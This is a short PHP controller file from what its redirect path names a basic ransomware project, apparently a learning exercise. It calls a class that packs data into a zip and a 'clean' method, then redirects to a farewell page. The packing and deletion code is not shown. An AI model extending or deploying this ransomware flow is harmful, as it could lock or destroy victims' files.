<?php
require_once '../model/empacarDatos.php';


$empaqueInstance = new EmpacarZip();
echo $empaqueInstance->empacarDatos();
echo $empaqueInstance->cleanSDR404();

header("Location: http://localhost/php-basic-ramsomware-MauricioPerez/views/despedida.html");